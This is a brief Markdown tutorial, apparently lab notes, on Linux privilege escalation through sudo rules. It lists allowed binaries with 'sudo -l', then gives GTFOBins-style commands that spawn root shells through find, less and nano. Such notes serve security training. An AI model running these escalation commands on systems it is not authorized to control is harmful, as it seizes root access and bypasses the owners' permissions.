# Privilege Escalation: Sudo

In this privilege escalation technique, we search for command can use sude without password and find exploit code from GTFObins that can be used to get root privilege.

---
* **using command " sudo -l " : to know bins and found it.**

![img](screenshots/sudo/sudo-l.png)

* **We find 3 bins :**
* **go to site : " https://gtfobins.linuxsec.org/ " and search exploit code to use it.**
* **search for " find " exploit code for this bin ,and we find " sudo find . -exec /bin/sh \\ ;  -quit "**

![img](screenshots/sudo/get_root_by_sudo-l.png)

---

* **search for " less " exploit code for this bin ,and we find " sudo less /etc/hosts "**

![img](screenshots/sudo/sudo_less.png)

* **Inside this page write " !/bin/bash "**

![img](screenshots/sudo/inside_less.png)

* **Then click enter ,now uou have root privilege**

![img](screenshots/sudo/get_root_by_less.png)

---

* **search for " nano " exploit code for this bin ,and we find " sudo nano "**

![img](screenshots/sudo/sudo_nano.png)

* **Then click ^R^X To open "command to execute : "**

![img](screenshots/sudo/nano_execute_command.png)

* **Now write " reset; sh 1>&0 2>&0 "**

![img](screenshots/sudo/exploit_command_nano.png)

* **You have root privilege inside nano page**

![img](screenshots/sudo/get_root_by_nano.png)

